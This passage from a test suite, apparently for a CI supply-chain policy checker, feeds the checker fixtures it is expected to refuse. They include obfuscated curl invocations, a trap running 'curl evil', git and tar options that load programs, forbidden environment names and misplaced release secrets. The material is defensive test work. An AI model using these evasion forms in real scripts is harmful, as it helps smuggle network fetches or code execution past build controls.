am g6_py 'python3 -I bin/witnessed.sh apk bin/stage-apk.sh' caught 'witnessed.sh'
am g6_sh 'sh bin/witnessed.sh apk bin/stage-apk.sh' caught 'witnessed.sh'
am g6_dot './bin/witnessed.sh apk bin/stage-apk.sh' caught 'witnessed.sh'
am g6_x 'bash -x bin/witnessed.sh apk bin/stage-apk.sh' caught 'witnessed.sh'
am g6_env 'env bash bin/witnessed.sh apk bin/stage-apk.sh' caught 'witnessed.sh'
# (7) the pinned step occurs exactly once
ydup() { python3 -c 'import os,sys;p=sys.argv[1]+"/.github/workflows/stage-build.yml";t=open(p).read();open(p,"w").write(t+sys.argv[2].replace("@@",os.environ["DG"]))' "$@"; }
d=$(pfix w7_same); ydup "$d" '      - id: digests
        name: again
        run: @@
'; expm caught "$d" 'pinned' "round-4 (7): the accepted step twice in the same job is an error"
d=$(pfix w7_job); ydup "$d" '  other:
    runs-on: ubuntu-24.04
    steps:
      - id: digests
        name: again
        run: @@
'; expm caught "$d" 'pinned' "round-4 (7): the same step in another job is an error"
d=$(pfix w7_id); ydup "$d" '      - id: other
        name: again
        run: @@
'; expm caught "$d" 'pinned' "round-4 (7): another step with a different id and the same run text is an error"
# (8) Python listed scripts: the alternate-name / versioned class applies to path-like strings
py8() { local d; d=$(mk "$1"); setfile "$d" bin/tool.py "#!/usr/bin/env python3\nimport subprocess\nX = \"$2\"\n"; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; echo "$d"; }
for pth in archive/vi archive/ash /usr/bin/python3.11 x/rbash usr/bin/perl5.38 x/gsed x/nodejs; do d=$(py8 "p8_${pth//\//_}" "$pth"); expm caught "$d" 'by a path' "round-4 (8): the Python string $pth is refused (deny-class last component)"; done
d=$(py8 p8_ok1 "archive/go.tar"); expm ok "$d" - "round-4 (8): control: a data path archive/go.tar is admitted"
d=$(py8 p8_ok2 "dist/data.json"); expm ok "$d" - "round-4 (8): control: dist/data.json is admitted"
# (10) minimal: an absolute path or a substitution as the command word
ABS10="$work/abs10/x"   # an absolute path in this run's own temp dir: never a fixed host path (advisor ruling, finding 5)
kc a10_a "$ABS10 arg" 'run time or absolute'
kc a10_b '$(echo x) arg' 'run time or absolute'
kc a10_c '`echo x` arg' 'run time or absolute'
kc a10_d '/opt/zz/tool' 'run time or absolute'
d=$(cfix a10_x "$ABS10 arg"); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"'"$ABS10"' arg","why":"x"}]'; expm ok "$d" - "round-4 (10): a script-name exception with the exact whole command waives an absolute-path command"
ko a10_ok 'cp x y'
# (11) more forbidden env names
for nm in PIP_INDEX_URL DOCKER_HOST KUBECONFIG KUBE_X TAR_OPTIONS MAKEFILES EDITOR VISUAL PAGER GH_HOST GH_REPO GH_EDITOR GH_PAGER GH_CONFIG_DIR OPENSSL_X REGISTRY_AUTH_FILE CC CXX CFLAGS LDFLAGS PWD; do
  d=$(mk "e11_$nm"); printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          %s: x\n        run: bash bin/build-stage.sh apk "$%s"\n' "$nm" "$nm" > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'never allowed' "round-4 (11): the env name $nm is forbidden in a step env"
  d=$(mk "f11_$nm"); printf '["DIGESTS","%s"]' "$nm" > "$d/.envnames.json"; gen "$d"; expm caught "$d" 'env_names' "round-4 (11): $nm in env_names is refused"
done
d=$(mk e11_tz); printf '["DIGESTS","TZ"]' > "$d/.envnames.json"; printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          TZ: UTC\n        run: bash bin/build-stage.sh apk "$TZ"\n' > "$d/.github/workflows/stage-verify.yml"; gen "$d"; expm ok "$d" - "round-4 (11): control: TZ stays allowed"
# (5, reduced) git configuration that loads a program
for form in 'git --config-env=core.sshCommand=X fetch' 'git -c core.editor=x commit' 'git -c core.pager=x log' 'git -c core.fsmonitor=x status' 'git -c core.hooksPath=x commit' 'git -c core.askPass=x fetch' 'git -c credential.helper=!x fetch' 'git -c credential.helper=x fetch' 'git -c diff.external=x diff' 'git -c gpg.program=x commit' 'git -c alias.x=!id x' 'git --config-env=alias.x=Y x' 'git --upload-pack=p fetch' 'git --receive-pack=p push' 'git --exec-path=x status' 'git --exec-path status'; do
  tr3 "r5_$RANDOM" "$form" '' '["git"]'
done
tr3 r5_gmake 'gmake x' '' '["gmake"]'
d=$(cfix r5_ok 'git -c user.name=x status' '["git"]'); expm ok "$d" - "round-4 (5): control: git -c user.name=x status is admitted"


# ---- PR 1b: deny exceptions are LINE-BOUND ({rule, line, line_sha256, count, why}); a carriage return is refused
dl() { # dl NAME 'script lines' 'python list of exceptions (D(line[,count]) builds a deny entry)' ok|caught FRAG [tools-json]
  local d; d=$(cfix "$1" "$2" "${6:-[]}"); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]='"$3"; expm "$4" "$d" "$5" "line-bound $1: $2 with $3"; }
dl lb_a 'git status\ngit push origin main' '[D("git status")]' caught "'git'"
dl lb_b 'git status' '[D("git status")]' ok -
dl lb_c 'git status\ngit status' '[D("git status")]' caught 'count'
dl lb_d 'git status\ngit status' '[D("git status", 2)]' ok -
dl lb_e 'git status' '[D("git status", 2)]' caught 'count'
dl lb_f "trap 'curl evil' EXIT\ncu\"\"rl x" '[D("cu\"\"rl x")]' caught "'curl'" '["trap"]'
for form in 'curl"$x" x' 'x=1 curl"$e" x' 'curl{,} x' 'curl`true` x'; do
  dl "lb_q_$RANDOM" "$form\necho ok" '[D("echo ok")]' caught "'curl'"
done
dl lb_g 'curl a' '[D("curl a")]' ok - '[]'
dl lb_i 'git status' '[D("git stat")]' caught 'stale'
dl lb_j 'git status' '[dict(D("git status"), line_sha256="0"*64)]' caught 'sha256'
dl lb_k 'git status' '[{"rule":"deny","text":"git status","why":"x"}]' caught 'line-bound'
dl lb_l 'git status' '[D("git status"), D("git status")]' caught 'twice'
dl lb_m 'git status' '[dict(D("git status"), count="1")]' caught 'count'
dl lb_n 'git status' '[dict(D("git status"), count=0)]' caught 'count'
dl lb_o 'git status' '[dict(D("git status"), count=True)]' caught 'count'
dl lb_p 'git status' '[dict(D("git status"), extra=1)]' caught 'line-bound'
dl lb_r 'git status' '[dict(D("git status"), why=" ")]' caught 'reason'
dl lb_s 'git status' '[D("git status\nx")]' caught 'line'
dl lb_t 'git status' '[D("")]' caught 'line'
dl lb_u 'git status' '[D("git\tstatus")]' caught 'line'
dl lb_v 'git status' '[D("git status")]' caught 'waives nothing' '["git"]'
dl lb_w 'git status' '[D("echo none")]' caught 'stale'
dl lb_x 'echo a \\\n  git status' '[D("echo a \\")]' caught "'git'"
dl lb_y 'git status \\\n  b' '[D("git status \\")]' ok -
dl lb_z 'tar --to-command=vi -xf a.tar\ntar --to-command=vi -xf a.tar b' '[D("tar --to-command=vi -xf a.tar")]' caught 'program-running option' '["tar"]'
dl lb_za 'git -c core.sshCommand=x fetch\ngit -c core.sshCommand=x fetch b' '[D("git -c core.sshCommand=x fetch")]' caught 'program-running option' '["git"]'
dl lb_zb 'tar --to-command=vi -xf a.tar' '[D("tar --to-command=vi -xf a.tar")]' ok - '["tar"]'
dl lb_zc 'git -c core.sshCommand=x fetch' '[D("git -c core.sshCommand=x fetch")]' ok - '["git"]'
d=$(wfix lb_zd); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("set -euo pipefail"))'; expm caught "$d" 'waives nothing' "line-bound: a deny entry for a line with no deny finding waives nothing (an error)"
# a carriage return anywhere is refused (the files are written as bytes)
crf() { local d; d=$(cfix "$1" 'echo a'); printf '%b' "$2" > "$d/bin/c.sh"; edit_spec "$d" 'rows["bin/c.sh"]["tools"]=[]'; echo "$d"; }
d=$(crf cr_a '#!/usr/bin/env bash\nset -euo pipefail\necho x\\\r\ncurl x\n'); expm caught "$d" 'carriage return' "line-bound: echo x\\<CR><LF>curl x is refused (bash does not join it)"
d=$(crf cr_b '#!/usr/bin/env bash\necho a\r\n'); expm caught "$d" 'carriage return' "line-bound: any script with a CR is refused"
d=$(crf cr_c '#!/usr/bin/env bash\ncurl a\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a\r")]'; expm caught "$d" 'carriage return' "line-bound: no waiver applies to a script with a CR"
d=$(crf cr_ok '#!/usr/bin/env bash\necho a\n'); expm ok "$d" - "line-bound: control: the same script without a CR"


# ---- PR 1b: a command-level deny finding on a command that spans several physical lines has NO waivable line
dl lc_a 'foo x \\\n  archive/vi' '[D("foo x \\")]' caught 'by a path'
dl lc_b 'tar \\\n -I sh x f' '[D("tar \\")]' caught 'program-running option' '["tar"]'
dl lc_c 'foo archive/vi \\\n  x' '[D("foo archive/vi \\")]' caught 'by a path'
dl lc_d 'echo a \\\n  git status' '[D("  git status")]' ok -
dl lc_e 'foo archive/vi' '[D("foo archive/vi")]' ok -
dl lc_f 'echo \\\n  $(foo archive/vi)' '[D("echo \\")]' caught 'by a path'
dl lc_g 'echo \\\n  $(foo archive/vi)' '[D("  $(foo archive/vi)")]' caught 'by a path'
dl lc_h 'find . \\\n -exec dist/sed {} +' '[D("find . \\")]' caught 'program-running option' '["find"]'
dl lc_i 'cat <<EOF\nline \\\ngit x\nEOF' '[D("git x")]' ok -
dl lc_j 'git status \\\n  archive/vi' '[D("git status \\")]' caught 'by a path'
dl lc_k 'git status \\\n  b' '[D("git status \\")]' ok -
dl lc_l 'tar -I sh x f' '[D("tar -I sh x f")]' ok - '["tar"]'
dl lc_m '# git is only documented here' '[]' caught "'git'"
dl lc_n '# git is only documented here' '[D("# git is only documented here")]' ok -
dl lc_o 'git -c core.sshCommand=x \\\n  fetch' '[D("git -c core.sshCommand=x \\")]' caught 'program-running option' '["git"]'
d=$(crf cr_d '#!/usr/bin/env bash\ncurl a\necho b\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a")]'; expm caught "$d" 'carriage return' "line-bound: a valid ASCII entry with a CR on another line of the script: no waiver applies"
cat > "$work/loadcr.py" <<'PY'
import importlib.util, os, sys
spec = importlib.util.spec_from_file_location("cts", os.environ["CHAIN_ROOT"] + "/bin/chain-test-signers.py"); cts = importlib.util.module_from_spec(spec); spec.loader.exec_module(cts)
rows, errs, _ = cts.load_scripts(sys.argv[1])
print("; ".join(errs) or "ok"); sys.exit(1 if errs else 0)
PY
d=$(crf cr_e '#!/usr/bin/env bash\necho a\r\n'); out=$(python3 "$work/loadcr.py" "$d" 2>&1) && { failn=$((failn + 1)); echo "FAIL line-bound: load_scripts (the records judge's path) accepts a script with a CR"; } || { grep -q 'carriage return' <<< "$out" && { pass=$((pass + 1)); echo "ok   line-bound: load_scripts alone rejects a script with a CR (caught: ${out:0:100})"; } || { failn=$((failn + 1)); echo "FAIL line-bound: load_scripts CR -> ${out:0:200}"; }; }

# ---- the named secrets of Release (rule 56: only Release holds a stored secret; advisor 0386 J, the corrected binding list) ----------------------------
# ONE closed list, five rows: (1) GH_TOKEN, the run's own token, Build job apk, admission only (witnessed.sh -> build-stage-apk.sh), job permissions exactly contents/checks/statuses/
# pull-requests read + id-token write (Witness); in stage-promote.yml job release (contents/packages/id-token write): (2) APK_RELEASE_SIGNING_KEY -> release-apks.sh,
# (3) DOCKERHUB_USERNAME and (4) DOCKERHUB_TOKEN -> release-publish.sh and release-sign.sh, (5) GH_TOKEN (the run's own) -> release-publish.sh, release-sign.sh, release-assets.sh,
# release-postverify.sh. bin/witnessed.sh is bound for GH_TOKEN at exactly those two places and for the three secrets in Release. Every other name, place or script is refused.
repl() { python3 -c 'import sys;p,a,b=sys.argv[1:4];a=a.replace("\\n","\n");t=open(p).read();assert a in t,"not found: "+a;open(p,"w").write(t.replace(a,b.replace("\\n","\n"),1))' "$@"; }
RCIF="if: \${{ !contains(github.ref_name, '\\''-'\\'') }}"
for f in stage-sign stage-reproducibility stage-verify stage-build; do
  probe "sec_$f" "stored secret outside Release" "a stored secret (secrets.X_KEY) in a step env of $f.yml" "printf '  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - name: x\n        env:\n          X_KEY: \${{ secrets.X_KEY }}\n        run: bash bin/install-scanner.sh cosign\n' >> .github/workflows/$f.yml"
done
probe gh_build_other "GH_TOKEN is allowed only" "the run's token on a Build step other than the admission step" \
  "repl .github/workflows/stage-build.yml '      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness' '      - name: install Witness (pinned by checksum)\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: bash bin/install-scanner.sh witness'"
probe gh_check "GH_TOKEN is allowed only" "the run's token in Check" \
  "repl .github/workflows/stage-verify.yml '      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness' '      - name: install Witness (pinned by checksum)\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: bash bin/install-scanner.sh witness'"
probe perm_apk "must hold exactly the permissions" "a write permission (packages) on Build's apk job" \
  "repl .github/workflows/stage-build.yml '      pull-requests: read\n      id-token: write\n' '      pull-requests: read\n      packages: write\n      id-token: write\n'"
probe perm_gh_release "must hold exactly the permissions" "the run's token with another permission (attestations: write) in Release" \
  "repl .github/workflows/stage-promote.yml '      packages: write\n      id-token: write\n    steps:' '      packages: write\n      id-token: write\n      attestations: write\n    steps:'"
probe sixth_name "not in the closed secret list" "a sixth secret name (FIFTH_KEY) in a Release step" \
  "repl .github/workflows/stage-promote.yml '      - name: release-sign under Witness\n        $RCIF\n        env:\n' '      - name: release-sign under Witness\n        $RCIF\n        env:\n          FIFTH_KEY: \${{ secrets.FIFTH_KEY }}\n'"
probe apk_wrong_step "not in the closed secret list" "the apk signing key on the publish step" \
  "repl .github/workflows/stage-promote.yml '      - name: release-publish under Witness\n        $RCIF\n        env:\n' '      - name: release-publish under Witness\n        $RCIF\n        env:\n          APK_RELEASE_SIGNING_KEY: \${{ secrets.APK_RELEASE_SIGNING_KEY }}\n'"
probe token_unlisted_script "not in the closed secret list" "DOCKERHUB_TOKEN bound to release-apks.sh (an unlisted script)" \
  "python3 -c 'import json;p=\".github/policy/chain-scripts.json\";d=json.load(open(p));d[\"ambient_env\"].append({\"name\":\"DOCKERHUB_TOKEN\",\"script\":\"bin/release-apks.sh\",\"why\":\"x\",\"file\":\".github/workflows/stage-promote.yml\",\"job\":\"release\"});[r.__setitem__(\"reads_env\",[\"APK_RELEASE_SIGNING_KEY\",\"DOCKERHUB_TOKEN\"]) for r in d[\"scripts\"] if r[\"path\"]==\"bin/release-apks.sh\"];json.dump(d,open(p,\"w\"))'"
probe name_twice "listed twice" "the same name listed twice at one place" \
  "python3 -c 'import json;p=\".github/policy/chain-scripts.json\";d=json.load(open(p));e=[x for x in d[\"ambient_env\"] if x[\"name\"]==\"GH_TOKEN\" and x[\"script\"]==\"bin/release-assets.sh\"][0];d[\"ambient_env\"].append(dict(e));json.dump(d,open(p,\"w\"))'"
probe sixth_row "not in the closed secret list" "a sixth row: SIXTH_SECRET bound to release-sign.sh in Release" \
  "python3 -c 'import json;p=\".github/policy/chain-scripts.json\";d=json.load(open(p));d[\"ambient_env\"].append({\"name\":\"SIXTH_SECRET\",\"script\":\"bin/release-sign.sh\",\"why\":\"x\",\"file\":\".github/workflows/stage-promote.yml\",\"job\":\"release\"});json.dump(d,open(p,\"w\"))'"
probe value_glued "must be exactly" "DOCKERHUB_TOKEN with a glued value" \
  "repl .github/workflows/stage-promote.yml 'DOCKERHUB_TOKEN: \${{ secrets.DOCKERHUB_TOKEN }}' 'DOCKERHUB_TOKEN: \${{ secrets.DOCKERHUB_TOKEN }}x'"
probe value_gh_secret "must be exactly" "GH_TOKEN read from a stored secret instead of the run's own token" \
  "repl .github/workflows/stage-promote.yml 'GH_TOKEN: \${{ github.token }}' 'GH_TOKEN: \${{ secrets.GH_TOKEN }}'"
probe value_swapped "must be exactly" "DOCKERHUB_USERNAME given the token's secret" \
  "repl .github/workflows/stage-promote.yml 'DOCKERHUB_USERNAME: \${{ secrets.DOCKERHUB_USERNAME }}' 'DOCKERHUB_USERNAME: \${{ secrets.DOCKERHUB_TOKEN }}'"
probe secret_in_if "stored secret outside" "a stored secret read in a step condition of Release" \
  "repl .github/workflows/stage-promote.yml '      - name: release-assets under Witness\n        $RCIF' '      - name: release-assets under Witness\n        if: \${{ !contains(github.ref_name, \"-\") && secrets.DOCKERHUB_TOKEN != \"\" }}'"

# ---- Codex A r2 blocker 4 / r3 F4 (advisor): NO actions/setup-go anywhere; Go comes from the checksum-pinned `bash bin/install-scanner.sh go` line -------------
# the stage grammar run on the REAL stage-build.yml (and on edited copies): the installer line is accepted, every use of setup-go is refused
cat > "$work/setupgo.py" <<'PY'
import copy, importlib.util, os, sys, yaml
root = os.environ["CHAIN_ROOT"]
spec = importlib.util.spec_from_file_location("cts", root + "/bin/chain-test-signers.py"); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
rows, errs, names = m.load_scripts(root)
GO = "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0"      # the digest the previous round allowed: now refused like any other action
def load(f): return yaml.load(open(os.path.join(root, ".github/workflows", f)).read(), Loader=yaml.BaseLoader)
def run(f, d):
    e, _ = m.stage_grammar(f, d, rows, names, ".github/workflows/" + f)
    return [x for x in e if "setup-go" in x or "install-scanner" in x]
def step(**kw): return dict({"uses": GO, "with": {"go-version-file": "go.mod", "cache": "false"}}, **kw)
out = []
def case(label, want_bad, got):
    out.append((label, bool(got) == want_bad, got[:1]))
b = load("stage-build.yml")
has = any(str(x.get("run", "")).strip() == "bash bin/install-scanner.sh go" for x in b["jobs"]["apk"]["steps"])
none = not any("setup-go" in str(x.get("uses")) for j in b["jobs"].values() for x in j["steps"])
case("the real stage-build.yml: the checksum-pinned `bash bin/install-scanner.sh go` line is present, accepted, and no setup-go is used", False,
     run("stage-build.yml", b) + ([] if has and none else ["the installer line is missing or setup-go is used"]))
def mut(f, edit):
    d = copy.deepcopy(load(f)); edit(d); return d
def apk(d): return d["jobs"]["apk"]["steps"]
def go_index(d):
    for i, s in enumerate(apk(d)):
        if "setup-go" in str(s.get("uses")): return i
    apk(d).insert(2, step()); return 2      # the file has none yet: the mutation cases then judge the step they add, so a missing allowance fails every case
def plain(d):
    s = apk(d)
    s[:] = [x for x in s if "setup-go" not in str(x.get("uses"))]; s.insert(2, step())
case("the previous round's allowance, exactly (pinned digest, go-version-file go.mod, cache false, before the Witness step) is now refused", True, run("stage-build.yml", mut("stage-build.yml", plain)))
case("the same exact step with a version comment in a stage-reproducibility.yml apk job is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["apk"]["steps"].insert(2, step()))))
case("a with: key besides the two is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"go-version": "1.20"}))))
case("cache: true is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"cache": "true"}))))
case("another go-version-file is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"go-version-file": "x/go.mod"}))))
case("a floating tag is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)].update({"uses": "actions/setup-go@v7"}))))
case("another digest is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)].update({"uses": "actions/setup-go@" + "1" * 40 + " # v7.0.0"}))))
case("an env on the step is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)].update({"env": {"MODE": "x"}}))))
def second(d): apk(d).insert(go_index(d) + 1, step())
case("a second setup-go step in the job is refused", True, run("stage-build.yml", mut("stage-build.yml", second)))
def after_witness(d):
    s = apk(d); g = s.pop(go_index(d)); s.append(g)
case("setup-go after the Witness step (the admission step) is refused", True, run("stage-build.yml", mut("stage-build.yml", after_witness)))
case("setup-go in job assemble is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: d["jobs"]["assemble"]["steps"].insert(1, step()))))
case("setup-go in stage-reproducibility.yml (Rebuild) is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["apk"]["steps"].insert(1, step()))))
case("setup-go in stage-sign.yml is refused", True, run("stage-sign.yml", mut("stage-sign.yml", lambda d: d["jobs"]["sign"]["steps"].insert(1, step()))))
for label, ok_, got in out:
    print(("ok   " if ok_ else "FAIL ") + "AC4/Go " + label + ("" if ok_ else " -> %r" % got))
PY
while IFS= read -r l; do
  case "$l" in ok*) pass=$((pass + 1)); echo "$l";; *) failn=$((failn + 1)); echo "$l";; esac
done < <(python3 "$work/setupgo.py" 2>&1)

# ---- Codex A r4 #2 / B F1: the judge prints its findings as structured ids, one for one with its own list (CHAIN_FINDINGS=1; stderr; output only) ----------------
fj="$work/fj"; mkdir -p "$fj"
d=$(tracked_copy fjson); printf 'cosign attest --type slsaprovenance x\n' > "$d/bin/fj-signer.sh"; ( cd "$d" && git add -A 2> /dev/null || true )
# the copy must be red by its OWN doing (it was red only because the real tree had an open finding, KR-SIGN-1): drop a listed script's row
( cd "$d" && python3 -c 'import json; p=".github/policy/chain-scripts.json"; d=json.load(open(p)); d["scripts"]=[r for r in d["scripts"] if r["path"]!="bin/vendor-provenance.py"]; json.dump(d, open(p,"w"), indent=1)' )
rc=0; CHAIN_FINDINGS=1 python3 "$work/judge.py" tree "$d" > "$fj/out.txt" 2> "$fj/err.txt" || rc=$?
rcp=0
python3 - "$fj/out.txt" "$fj/err.txt" "$rc" <<'PY' || rcp=$?
import json, sys
out = open(sys.argv[1]).read().rstrip("\n"); lines = [l for l in open(sys.argv[2]).read().split("\n") if l.startswith("FINDINGS-JSON ")]
assert sys.argv[3] == "1" and len(lines) == 1, (sys.argv[3], len(lines))
ids = json.loads(lines[0][len("FINDINGS-JSON "):])
assert isinstance(ids, list) and ids and all(isinstance(x, str) for x in ids)
assert "; ".join(ids) == out, "printed list and ids differ"
PY
if [ "$rcp" = 0 ]; then pass=$((pass + 1)); echo "ok   findings ids: the FINDINGS-JSON line is the judge's own findings, one for one with the printed list (rc 1, none dropped, none added, same order)"
else failn=$((failn + 1)); echo "FAIL findings ids: the printed structured ids differ from the judge's list"; fi
rc=0; env -u CHAIN_FINDINGS python3 "$work/judge.py" tree "$d" > /dev/null 2> "$fj/err2.txt" || rc=$?
if ! grep -q 'FINDINGS-JSON' "$fj/err2.txt"; then pass=$((pass + 1)); echo "ok   findings ids: nothing is printed unless CHAIN_FINDINGS=1 (no change to the judge's existing output)"; else failn=$((failn + 1)); echo "FAIL findings ids: printed without CHAIN_FINDINGS=1"; fi

# ---- advisor ruling (finding 5): no file of the HOST may change a verdict ------------------------------------------------------------------------------
# "an absolute command word is judged by the rule alone (refused unless listed), never by os.path.isfile/exists against the host": the same listed script is judged
# with no file at the absolute path, and again with an executable file with a shebang there (and with a plain file): the three outputs must be the same text.
hostjudge() { # hostjudge LABEL 'script line using $ABS' : the verdict does not depend on a host file at $ABS
  local label=$1 line=$2 d abs o1 o2 o3 rc1=0 rc2=0 rc3=0
  abs="$work/hostfile-$RANDOM/tool"
  d=$(cfix "hj_$RANDOM" "${line//\$ABS/$abs}")
  o1=$(judge tree "$d" 2>&1) || rc1=$?
  mkdir -p "$(dirname "$abs")"; printf '#!/usr/bin/env bash\necho x\n' > "$abs"; chmod 755 "$abs"
  o2=$(judge tree "$d" 2>&1) || rc2=$?
  chmod 644 "$abs"; printf 'plain text\n' > "$abs"
  o3=$(judge tree "$d" 2>&1) || rc3=$?
  rm -rf "$(dirname "$abs")"
  if [ "$rc1" = "$rc2" ] && [ "$rc1" = "$rc3" ] && [ "$o1" = "$o2" ] && [ "$o1" = "$o3" ]; then pass=$((pass + 1)); echo "ok   host independence: $label (same verdict with no file, an executable file and a plain file at the absolute path)"
  else failn=$((failn + 1)); echo "FAIL host independence: $label -> rc $rc1/$rc2/$rc3; without: ${o1:0:200} | with an executable: ${o2:0:200}"; fi
}
hostjudge "an absolute command word" '$ABS arg'
hostjudge "an absolute command word as the second command" 'echo a
$ABS --flag x'
hostjudge "an absolute path as an argument of a listed tool" 'cat $ABS'
hostjudge "an absolute path after an interpreter" 'python3 $ABS'
hostjudge "an absolute path inside an assignment" 'x=$ABS'

EXPECT=1447
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
